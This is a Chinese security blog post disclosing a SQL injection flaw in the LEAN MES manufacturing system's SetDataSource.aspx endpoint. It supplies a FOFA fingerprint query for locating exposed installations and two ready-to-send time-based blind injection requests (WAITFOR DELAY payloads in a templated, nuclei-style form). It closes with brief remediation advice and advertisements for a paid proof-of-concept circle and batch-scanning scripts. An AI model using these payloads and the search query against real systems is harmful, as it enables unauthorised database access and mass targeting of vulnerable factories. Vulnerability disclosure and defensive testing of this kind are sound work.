#  深科特 LEAN MES系统 SetDataSource.aspx 存在SQL注入漏洞  
北雪网络安全
                    北雪网络安全  北雪网络安全   2026-10-14 01:31  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjXfRMicvkFrGNS8ygKfMJbNFJpeDFSHN4LJzOGAVrGic0eQVI85XWjvNssY22ldxZibzeEyxUyI8qcTXhib8n5zkIm5rDtbhn6iaZ0/640?wx_fmt=png&from=appmsg "")  
  
网络安全为人民，网络安全靠人民  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzhxBYvW6SjfLFTK11ib5Zbold2DQaYF4QsY93tAzEscBmFPUOGicFbb9wrqibJrg7kb2DLm9Q9685mJIV7IdzwI0LONFYqC2pstiak/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzjzBmehYL7LQYmzxkemUiaY0pwJ4TsdKBiaxMkP1PeAYX29icHNjEyNLIfFhEwpfGg7fdJpib0cGQDW4ibHGaicwAP3flQ5K4Q7r0D5o/640?wx_fmt=png&from=appmsg "")  
  
**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzj6onkEWYNvribgasJQ0LiaOYAZ0lwnRduoq0uLpsy33T4Uyl184HGuiaJicFkYicf5SjYoicNfbHJ9ibZDa2fBoCQtnHEa3JiaZZ41eys/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
01  
  
更多内容  
  
#### 网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296  
  
  
02  
  
搜索引擎  
  
  
fofa  
：  
(title="LEAN MES -   
用户登录  
" && body="LEAN MES") || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"  
  
  
03  
  
漏洞复现  
  
LEAN MES  
系统是由深圳市深科特信息技术有限公司开发的一款应用系统，主要用于生产调度、产品跟踪、质量控制等车间管理功能。  
LEAN MES  
精益制造执行系统通过强调制造过程的信息化和透明化，帮助企业由粗放式向精益化管理模式升级。该系统  
/SDP/SetDataSource.aspx  
接口存在  
SQL  
注入漏洞，攻击者可以通过构造恶意的  
SQL  
语句，获取数据库中的敏感信息或对数据库进行未授权操作，可能导致数据泄露、篡改或系统崩溃。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgGYZ3pL8ic9ykUAyrLqqZ0peyBaCp7RAb5icpKOqbb9yW0SJpBJynL5kmnibE1iaicqzW67mM9hxYhySjOhNuIQibRmWdCt131tOygE/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziaz7Kibg8BysgtgYEsuxibXOyVkc8Xm90Zc4ZTlswGibK4WrM2EGr6OhUO7jA2uBNRiakoM26ydFpD4KtTDeyMBZInK5actXbmyh4M/640?wx_fmt=png&from=appmsg "")  
  
```
GET /SDP/SetDataSource.aspx?modelId=1&SourceType=%27WAITFOR+DELAY+%270%3A0%3A2%27-- HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like
Gecko) Chrome/116.0.5845.111 Safari/537.36
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSziagYswpPeFAicribTtY4rr29u23xn4FdocA1EgCKV8mvUCPgr9v3UDz9GeRsSiaz3icKnia4nqUlFOmNX7rltGV951fLlicPGbSPfsDY/640?wx_fmt=png&from=appmsg "")  
```
GET /SDP/SetDataSource.aspx?modelId=1&SourceType=%27WAITFOR+DELAY+%270%3A0%3A4%27-- HTTP/1.1
Host: {{Hostname}}
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzg7eWmUibXVItwB4SdnVk93SDoh92bwvAP3INjZT9jGxJ0Bf2GJV0ibUhRVCr9OayZ3ichiaqFB46UjaWf59bvrdaZwFpQoS0MOFW0/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjH36PsnkYNPibEKHX4uBDibjicRGZSIo2r8884HzZONxL5nZCBBgK831J1eYNGXsyxChDRD75z2uWH7RVQZuyxUlaItr2d4DDnP4/640?wx_fmt=png&from=appmsg "")  
  
  
      
  
04  
  
修复建议  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本  
  
05  
  
内部圈子  
  
🛠️   
【知名漏洞实战圈，纯干货】  
🛠️  
  
还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！  
目前已更新poc数量2500+  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzglbria8rTzib3JVsnYfmH96QmenKGMJniasB6UZrJ0PuNodlWgibaJDRvt1NA6iaux5n3GP4g5AC70mqJ1KWHuFmX4btPicZLMJ41VE/640?wx_fmt=png&from=appmsg "")  
  
  
🎯 适用场景  
  
**▫️渗透测试▫️企业漏洞自查▫️攻防演练▫️安全服务▫️合规运营**  
  
****  
  
**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**  
  
**▫️全民掌握网安技能，共守智能时代晴空。**  
  
  
  
  
  
  
